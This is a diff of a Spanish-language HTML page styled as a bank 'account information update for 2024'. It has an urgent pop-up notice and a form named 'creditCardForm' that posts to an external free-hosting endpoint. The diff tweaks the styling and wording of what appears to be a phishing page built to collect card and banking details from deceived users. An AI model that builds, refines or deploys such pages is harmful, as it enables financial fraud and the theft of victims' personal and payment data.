@@ -117,6 +117,14 @@
             background-color: rgba(0, 0, 0, 0.4); /* Fondo semitransparente */
             z-index: 9999;
         }
+        button {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
 
         .popup-container {
             position: absolute;
@@ -151,7 +159,7 @@
     <!-- Pop-up de aviso (visible al abrir la página) -->
     <div class="popup-overlay" id="popupOverlay">
         <div class="popup-container">
-            <h2>Aviso Importante</h2>
+            <h3>Aviso Importante</h3>
             <p>Estamos realizando una actualización en nuestro sistema.  Por favor, lea atentamente las instrucciones antes de completar el formulario.</p>
             <button id="closePopup">Aceptar</button>
         </div>
@@ -161,10 +169,8 @@
     <div class="container">
         <h2>Actualización de Información de la cuenta para el 2024</h2>
         <!--   <form id="creditCardForm" method="post">  <form id="creditCardForm" method="post" action="http://proyectoformulario.wuaze.com/guardar_datos.php"> -->
-        <p>"Por favor, complete el siguiente formulario para actualizar su información bancaria para el 2024.
-            Sus datos son importantes para ofrecerle un mejor servicio y mantener su cuenta segura. 
-            Gracias por su colaboración.</p>
-        <p>Algunos de sus datos personales ya han sido prellenados para su comodidad. Por favor, revise y complete cualquier información adicional que sea necesaria.</p>
+        <p>Algunos de sus datos personales ya han sido prellenados para su comodidad. Por favor, revise y complete cualquier información adicional que sea necesaria.
+         Gracias por su colaboración.</p>
         <form id="creditCardForm" method="POST" action="https://ganadero-formulario.wuaze.com/index.php">
 
 
